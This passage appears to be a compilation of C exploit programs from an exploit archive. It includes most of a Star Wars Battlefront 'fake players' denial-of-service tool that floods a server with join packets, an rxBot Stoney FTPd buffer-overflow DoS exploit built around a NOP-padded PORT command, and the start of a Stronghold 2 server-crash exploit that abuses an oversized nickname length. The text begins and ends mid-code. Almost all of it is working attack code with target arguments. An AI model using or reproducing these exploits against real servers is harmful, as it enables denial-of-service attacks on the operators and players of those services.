        0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd,
        0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9,
        0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75,
        0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011,
        0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd,
        0x9823b6e0, 0x9ce2ab57, 0x91a18d8e, 0x95609039,
        0x8b27c03c, 0x8fe6dd8b, 0x82a5fb52, 0x8664e6e5,
        0xbe2b5b58, 0xbaea46ef, 0xb7a96036, 0xb3687d81,
        0xad2f2d84, 0xa9ee3033, 0xa4ad16ea, 0xa06c0b5d,
        0xd4326d90, 0xd0f37027, 0xddb056fe, 0xd9714b49,
        0xc7361b4c, 0xc3f706fb, 0xceb42022, 0xca753d95,
        0xf23a8028, 0xf6fb9d9f, 0xfbb8bb46, 0xff79a6f1,
        0xe13ef6f4, 0xe5ffeb43, 0xe8bccd9a, 0xec7dd02d,
        0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae,
        0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072,
        0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16,
        0x018aeb13, 0x054bf6a4, 0x0808d07d, 0x0cc9cdca,
        0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde,
        0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02,
        0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066,
        0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba,
        0xaca5c697, 0xa864db20, 0xa527fdf9, 0xa1e6e04e,
        0xbfa1b04b, 0xbb60adfc, 0xb6238b25, 0xb2e29692,
        0x8aad2b2f, 0x8e6c3698, 0x832f1041, 0x87ee0df6,
        0x99a95df3, 0x9d684044, 0x902b669d, 0x94ea7b2a,
        0xe0b41de7, 0xe4750050, 0xe9362689, 0xedf73b3e,
        0xf3b06b3b, 0xf771768c, 0xfa325055, 0xfef34de2,
        0xc6bcf05f, 0xc27dede8, 0xcf3ecb31, 0xcbffd686,
        0xd5b88683, 0xd1799b34, 0xdc3abded, 0xd8fba05a,
        0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637,
        0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb,
        0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f,
        0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53,
        0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47,
        0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b,
        0x0315d626, 0x07d4cb91, 0x0a97ed48, 0x0e56f0ff,
        0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623,
        0xf12f560e, 0xf5ee4bb9, 0xf8ad6d60, 0xfc6c70d7,
        0xe22b20d2, 0xe6ea3d65, 0xeba91bbc, 0xef68060b,
        0xd727bbb6, 0xd3e6a601, 0xdea580d8, 0xda649d6f,
        0xc423cd6a, 0xc0e2d0dd, 0xcda1f604, 0xc960ebb3,
        0xbd3e8d7e, 0xb9ff90c9, 0xb4bcb610, 0xb07daba7,
        0xae3afba2, 0xaafbe615, 0xa7b8c0cc, 0xa379dd7b,
        0x9b3660c6, 0x9ff77d71, 0x92b45ba8, 0x9675461f,
        0x8832161a, 0x8cf30bad, 0x81b02d74, 0x857130c3,
        0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640,
        0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c,
        0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8,
        0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24,
        0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30,
        0x029f3d35, 0x065e2082, 0x0b1d065b, 0x0fdc1bec,
        0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088,
        0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654,
        0xc5a92679, 0xc1683bce, 0xcc2b1d17, 0xc8ea00a0,
        0xd6ad50a5, 0xd26c4d12, 0xdf2f6bcb, 0xdbee767c,
        0xe3a1cbc1, 0xe760d676, 0xea23f0af, 0xeee2ed18,
        0xf0a5bd1d, 0xf464a0aa, 0xf9278673, 0xfde69bc4,
        0x89b8fd09, 0x8d79e0be, 0x803ac667, 0x84fbdbd0,
        0x9abc8bd5, 0x9e7d9662, 0x933eb0bb, 0x97ffad0c,
        0xafb010b1, 0xab710d06, 0xa6322bdf, 0xa2f33668,
        0xbcb4666d, 0xb8757bda, 0xb5365d03, 0xb1f740b4 };
    unsigned long   crc = 0xffffffffL;

    while(size--) {
        crc = crctable[*data ^ (crc >> 24)] ^ (crc << 8);
        data++;
    }
    return(~crc);
}



/*

Read/Write bits to buffer 0.1.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:    http://aluigi.altervista.org

max 32 bits numbers supported (from 0 to 4294967295).
Probably not the fastest bit packing functions existent, but I like them.

*/



unsigned long read_bits(    // number read
  unsigned long bits,       // how much bits to read
  unsigned char *in,        // buffer from which to read the number
  unsigned long in_bits     // position of the buffer in bits
) {
    unsigned long   seek_bits,
                    rem,
                    seek = 0,
                    ret  = 0,
                    mask = -1L;

    if(bits > 32) return(0);
    if(bits < 32) mask = (1 << bits) - 1;
    for(;;) {
        seek_bits = in_bits & 7;
        ret |= ((*(in + (in_bits >> 3)) >> seek_bits) & mask) << seek;
        rem = 8 - seek_bits;
        if(rem >= bits) break;
        bits    -= rem;
        in_bits += rem;
        seek    += rem;
        mask    = (1 << bits) - 1;
    }
    return(ret);
}



unsigned long write_bits(   // position where the stored number finishs
  unsigned long data,       // number to store
  unsigned long bits,       // how much bits to occupy
  unsigned char *out,       // buffer on which to store the number
  unsigned long out_bits    // position of the buffer in bits
) {
    unsigned long   seek_bits,
                    rem;

    if(bits > 32) return(out_bits);
    if(bits < 32) data &= ((1 << bits) - 1);
    for(;;) {
        seek_bits = out_bits & 7;
        *(out + (out_bits >> 3)) &= (1 << seek_bits) - 1;   // zero
        *(out + (out_bits >> 3)) |= (data << seek_bits);
        rem = 8 - seek_bits;
        if(rem >= bits) break;
        out_bits += rem;
        bits     -= rem;
        data     >>= rem;
    }
    return(out_bits + bits);
}




#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}



    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.3.1"
#define BUFFSZ      8192
#define PORT        3658
#define TIMEOUT     3
#define NEEDPWD     "\x05\x00\x00\x00\x01\x02\x00\x00\x00"
#define WRONGVER    "\x05\x00\x00\x00\x01\x04\x00\x00\x00"
#define CHR         'a'



void show_info_1_1(u_char *data);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    u_long      bits,
                mem_offset = 0;
    int         sd,
                i,
                len,
                pcklen,
                nicklen,
                on         = 1,
                timewait   = ONESEC,
                hexdump    = 0,
                guest      = 0,
                src_nat    = 0,
                dst_nat    = 0,
                info_only  = 0,
                server_ver = 0;   /* 0 = 1.0 and 1.01, 1 = 1.1, and so on */
    u_short     port = PORT;
    u_char      *buff,
                *pck,
                *b,
                *nick      = "",
                *pwd       = "";


    setbuf(stdout, NULL);

    fputs("\n"
        "Star Wars Battlefront Fake Players DoS and Tester "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <host>\n"
            "\n"
            "Options:\n"
            "-p PORT   server port (%d)\n"
            "-n NICK   the nick you want to use for your fake player (default is none)\n"
            "-w PASS   the password to use if the server is protected\n"
            "-i        shows server informations and exits. Works perfectly with servers\n"
            "          >= 1.1 but second half of the info are wrong for servers <= 1.01\n"
            "-t SEC    seconds to wait when the server is full, default is 1\n"
            "-v NUM    version number to use for joining a server, by default the number\n"
            "          is automatically scanned finding the exact server version\n"
            "\n"
            "Test options:\n"
            "-x        shows the hex dump of the join-reply packets received\n"
            "-g        enable the guest player, practically with one single packet is\n"
            "          able to fill 2 player positions and one of them is called Guest\n"
            "-s SIZE   uses a nickname constituited by SIZE chars '%c'\n"
            "-m 0xOFF  enable a server's option that lets clients to send a memory location\n"
            "          that will be read by the server (PS2 servers don't support it)\n"
            "-f NUM    another test option that enable the usage of internal IPs (NAT).\n"
            "          Since it is only for testing, all the IP and port used by this tool\n"
            "          are those of the same server. Use -f 1 to enable client's NAT, 2 for\n"
            "          the server or 3 to enable both\n"
            "\n", argv[0], port, CHR);
        exit(1);
    }

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'p': port = atoi(argv[++i]); break;
            case 'n': nick = argv[++i]; break;
            case 'w': pwd = argv[++i]; break;
            case 'i': info_only = 1; break;
            case 't': {
                timewait = atoi(argv[++i]);
                printf("- time to wait:   %d seconds\n", timewait);
#ifdef WIN32
                timewait *= 1000;
#endif
                } break;
            case 'v': server_ver = atoi(argv[++i]); break;
            case 'x': hexdump = 1; break;
            case 'g': guest = 1; break;
            case 's': {
                nicklen = atoi(argv[++i]);
                nick = malloc(nicklen + 1);
                if(!nick) std_err();
                memset(nick, CHR, nicklen);
                nick[nicklen] = 0x00;
                } break;
            case 'm': {
                i++;
                if(argv[i][1] == 'x') sscanf(argv[i], "0x%lx", &mem_offset);
                    else sscanf(argv[i], "%lu", &mem_offset);
                printf("- memory offset:   0x%08lx\n", mem_offset);
                } break;
            case 'f': {
                switch(atoi(argv[++i])) {
                    case 1: src_nat = 1; break;
                    case 2: dst_nat = 1; break;
                    case 3: src_nat = dst_nat = 1; break;
                    default: {
                        fputs("\nError: NAT options are 1, 2 or 3\n\n", stdout);
                        exit(1);
                        } break;
                }
                } break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                } break;
        }
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr  = resolv(argv[argc]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sd) std_err();

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

        /* BUILD INFO PACKET */

    memset(buff, 0x00, BUFFSZ); /* no longer needed */

    buff[0] = 2;                /* info packet */
    *(u_short *)(buff + 2) = 0xffff;
    *(u_short *)(buff + 4) = 0;
    b = buff + 5;

    bits = write_bits(0,  1, b, 0);
    bits = write_bits(time(NULL), 32, b, bits); // track ID 1 | used to track our
    bits = write_bits(0,  4, b, bits);          // track ID 2 | query in the reply

    pcklen = 5 + (bits >> 3);
    if(bits & 7) pcklen++;
    i = (pcklen - 5) & 3;       /* SWB decodes 32 bits of data each time */
    if(i) pcklen += (4 - i);

        /* END INFO PACKET */

    if(sendto(sd, buff, pcklen, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nError: socket timeout, probably the server uses another port\n\n", stdout);
        exit(1);
    }
    if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
      < 0) std_err();
    show_info_1_1(buff);
    close(sd);

    if(info_only) return(0);

        /* BUILD JOIN PACKET */

    memset(buff, 0x00, BUFFSZ); /* no longer needed */

    buff[0] = 4;            /* join packet */
    *(u_short *)(buff + 2) = 0xffff;
    *(u_short *)(buff + 4) = 0;
    b = buff + 5;

    bits = write_bits(server_ver, 12, b, 0);
    bits = write_bits(swbcrc(pwd, strlen(pwd)), 32, b, bits);
    bits = write_bits(guest, 1, b, bits);   // if 1, add also a Guest player
    bits = write_bits(1, 2, b, bits);       // don't know

    nicklen = strlen(nick);
    bits = write_bits(nicklen, 8, b, bits);
    for(i = 0; i < nicklen; i++) {
        bits = write_bits(nick[i], 8, b, bits);
    }

    i = bits >> 3;
    if(bits & 7) i++;
    if(i & 3) i += (4 - (i & 3));
    bits = (i + 4) << 3;    /* 4 = there is a 32 bit number between the 2 bits containers */

    bits = write_bits(0, 32, b, bits);      // don't know
    if(mem_offset) {
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(mem_offset, 32, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    bits = write_bits(1, 1, b, bits);       // don't know
    bits = write_bits(1, 1, b, bits);       // don't know

        /* IP and port in little-endian (I know that on a big-endian CPU this instructions
           don't return the exact IP and port, but is not important for this tool) */

    bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);    /* source IP */
    bits = write_bits(port, 16, b, bits);                           /* source port */

    if(src_nat) {   /* LAN IP and port of the client */
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);
        bits = write_bits(port, 16, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);    /* dest IP */
    bits = write_bits(port, 16, b, bits);                           /* dest port */

    if(dst_nat) {   /* LAN IP and port of the server */
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);
        bits = write_bits(port, 16, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    pcklen = 5 + (bits >> 3);
    if(bits & 7) pcklen++;
    i = (pcklen - 5) & 3;       /* SWB decodes 32 bits of data each time */
    if(i) pcklen += (4 - i);

        /* END JOIN PACKET */

    pck = malloc(pcklen);
    if(!pck) std_err();
    memcpy(pck, buff, pcklen);
    b = pck + 5;

    fputs("- start fake players attack:\n\n", stdout);
    for(;;) {
        for(;;) {
            fputs("  player: ", stdout);

            sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if(sd < 0) std_err();

            if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
              < 0) std_err();
            peerl.sin_port++;
            if(bind(sd, (struct sockaddr *)&peerl, sizeof(peerl))
              < 0) std_err();

            if(sendto(sd, pck, pcklen, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            fputc('.', stdout);

            if(timeout(sd) < 0) {
                fputs("\n"
                    "Error: socket timeout, no reply received\n"
                    "\n", stdout);
                exit(1);
            }
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) std_err();
            fputc('.', stdout);
            close(sd);

            if(*buff != 6) {
                if(buff[5] == 1) {
                    break;  // full
                } else if(!memcmp(buff, NEEDPWD, len)) {
                    fputs("\n"
                        "Error: seems the server is password protected, use the -w option and specify\n"
                        "       the correct password\n"
                        "\n", stdout);
                    exit(1);
                } if(!memcmp(buff, WRONGVER, len)) {
                    server_ver = read_bits(12, b, 0);
                    printf(" wrong version (%d), I try to scan the next version\n", server_ver++);
                    write_bits(server_ver, 12, b, 0);
                    continue;
                }

                fputs("\nError: unknown error, check the following dump:\n", stdout);
                show_dump(buff, len, stdout);
                exit(1);
            }

            fputs(" ok\n", stdout);

            if(hexdump) {
                show_dump(buff, len, stdout);
                fputc('\n', stdout);
            }
        }

        fputs(" server full\n", stdout);
        sleep(timewait);
    }

    return(0);
}



    /* STAR WARS BATTLEFRONT 1.1 */
void show_info_1_1(u_char *data) {
    u_long  len,
            bits = 0;

    data += 5;
    read_bits(32, data, bits); bits += 32;      /* track ID 1, the same of our query */
    read_bits(4, data, bits);  bits += 4;       /* track ID 1, the same of our query */
    fputs("\n  Server name:        ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputs("\n  Gametype:           ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputs("\n  Mission:            ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputc('\n', stdout);
    printf("  Dedicated           %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Team Auto Assign    %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Heroes              %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Team Damage         %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Password            %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  AI Units            %lu\n", read_bits(8, data, bits));                bits += 8;
    printf("  Score               %lu to ", read_bits(11, data, bits));             bits += 11;
    printf("%lu\n", read_bits(11, data, bits));                                     bits += 11;
    printf("  Players             %lu\n", read_bits(7, data, bits));                bits += 7;
    len = read_bits(7, data, bits);
    if(!len) {
        fputs("\n"
            " The version of this server is not compatible with the query protocol used by\n"
            " this tool. All the informations until Password should be correct\n"
            "\n", stdout);
        return;
    }
    bits += 7;
    printf("  Max Players         %lu\n", len);
    printf("  ???                 %lu\n", read_bits(3, data, bits));                bits += 3;
    printf("  ???                 %lu\n", read_bits(8, data, bits));                bits += 8;
    printf("  Min Players         %lu\n", read_bits(7, data, bits));                bits += 7;
    printf("  AI Difficulty       %lu\n", read_bits(2, data, bits));                bits += 2;
    printf("  Show Player Names   %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Spawn Invincibility %lu\n", read_bits(6, data, bits));                bits += 6;
    fputc('\n', stdout);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



// milw0rm.com [2004-11-24]
/* untested /str0ke */

/*
	rx-dos.c by D-oNe	

	There exists a buffer overflow in Stoneys FTPd that most rxBot mod's use.
	The problem lies in how the code parses the PORT command and gives an opportunity
	for a buffer overflow.
	
	Problem is that the ftpd also uses select() to handle multiple connections. So when
	sending the crafted PORT command select() returns NULL making it return and exit the
	FTPd thread resulting merely in a Denial Of Service of the FTPd with no crash of the bot
	itself.

	Tested with "rxBot reptile 0.37".
*/

#pragma comment(lib, "ws2_32")

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

unsigned char user[] =
	"\x55\x53\x45\x52\x20\x31";

unsigned char pass[] =
	"\x50\x41\x53\x53\x20\x31";

unsigned char overflow[] =
	"\x50\x4F\x52\x54\x20"
	"\x31\x2C\x31\x2C\x31\x2C\x31\x2C\x31\x2C\x31"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90";

int main(int argc, char *argv[])
{
	char szBuffer[128];
	struct sockaddr_in sin;
	SOCKET sock;
	WSADATA wsadata;
		printf("\nrxBot Stoney FTPd Denial Of Service Exploit by D-oNe\n\n");
	if (argc < 3) 
	{
			printf("usage: %s <ip> <port>\n", argv[0]);
			printf("[-] Exiting...\n");
			return 0;
	}
	if (WSAStartup(0x0202, &wsadata) != 0)
	{
			printf("[-] WSAStartup() failed!\n");
			return 0;
	}
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(argv[1]);
		sin.sin_port = htons(atoi(argv[2]));
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == SOCKET_ERROR)
	{
			printf("[-] socket() failed!\n");
			return 0;
	}
		printf("[+] Connecting...\n");
	if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
			printf("[-] connec()t failed!\n");
			return 0;
	}
		recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
	if ((szBuffer[0] != '2') && (szBuffer[1] != '2') && (szBuffer[2] != '0'))
	{
			printf("[-] Wrong string received!\n");
			return 0;
	}
		printf("[+] Sending USER...\n");
	if (!send(sock, user, sizeof(user), 0))
	{
			printf("[-] send() failed!\n");
			return 0;
	}
		recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
	if ((szBuffer[0] != '3') && (szBuffer[1] != '3') && (szBuffer[2] != '1'))
	{
			printf("[-] Wrong string received!\n");
			return 0;
	}
		printf("[+] Sending PASS...\n");
	if (!send(sock, pass, sizeof(pass), 0))
	{
			printf("[-] send() failed!\n");
			return 0;
	}
		recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
	if ((szBuffer[0] != '2') && (szBuffer[1] != '3') && (szBuffer[2] != '0'))
	{
			printf("[-] Wrong string received!\n");
			return 0;
	}
		printf("[+] Sending malicious PORT command...\n");
	if (!send(sock, overflow, sizeof(overflow), 0))
	{
			printf("[-] send() failed!\n");
			return 0;
	}
		memset(szBuffer, 0, sizeof(szBuffer));
		recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
		szBuffer[strlen(szBuffer) - 1] = '\0';
		printf("[+] Recvd: %s\n", szBuffer);
		closesocket(sock);
		WSACleanup();
		printf("[+] FTPd should be out of service!\n", szBuffer);
		return 0;
}

// milw0rm.com [2005-09-16]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "gssdkcr.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      8192
#define PORT        19966
#define TIMEOUT     1
#define TWAIT       10
#define BOOMSZ      0xffffffff  // impossible to allocate

#define ADDSHORT(x) *(u_short *)p = x; \
                    p += 2;
#define ADDINT(x)   *(u_int *)p = x; \
                    p += 4;
#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();
#define RECV(x,y)   len = recvfrom(sd, x, y, 0, NULL, NULL); \
                    if(len < 0) std_err();
#define SOCKTOUT    if(len < 0) { \
                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
                        exit(1); \
                    }



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz);
void show_info(u_char *data, int len);
int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    u_int   seed;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ + 1],
            info[] =
                "\xfe\xfd" "\x00" "\x00\x00\x00\x00" "\xff\x00\x00",
            *psdk,
            *p;

#pragma pack(1) // a basic header (only sign and type remain the same)
    struct gssdk_header {
        u_short sign;
        u_char  type;
        u_short gs1;
        u_short gs2;
    } *gh;
#pragma pack()

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Stronghold 2 <= 1.2 server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    *(u_int *)(info + 3) = ~time(NULL);
    len = send_recv(sd, info, sizeof(info) - 1, buff, BUFFSZ);
    close(sd);
    SOCKTOUT;

    buff[len] = 0x00;
    show_info(buff, len);

    gh = (struct gssdk_header *)buff;
    psdk = buff + 7;
    seed = time(NULL);

    fputs("\n- start attack:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    gh->sign = htons(0xfefe);
    gh->type = 1;
    gh->gs1  = htons(0);
    gh->gs2  = htons(0);
    memset(psdk, '0', 32);
    gssdkcr(psdk, psdk, 0);

    len = send_recv(sd, buff, 39, buff, BUFFSZ);
    SOCKTOUT;
    buff[len] = 0x00;
    if((gh->type != 2) || (ntohs(gh->gs1) != 0) || (ntohs(gh->gs2) != 1)) {
        fputs("  the first packet doesn't seem to have been accepted, I continue\n", stdout);
    }

    gh->sign = htons(0xfefe);
    gh->type = 3;
    gh->gs1  = htons(1);
    gh->gs2  = htons(1);
    gssdkcr(psdk, buff + 39, 0);
    p = psdk + 32;

    ADDINT(BOOMSZ); // nickname size, it's all we need

    len = send_recv(sd, buff, p - buff, buff, BUFFSZ);
    while(len > 0) {
        if((gh->type == 4) || (gh->type == 5)) break;
        if(timeout(sd) < 0) break;
        RECV(buff, BUFFSZ);
    }
    close(sd);

    fputs("- check server:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
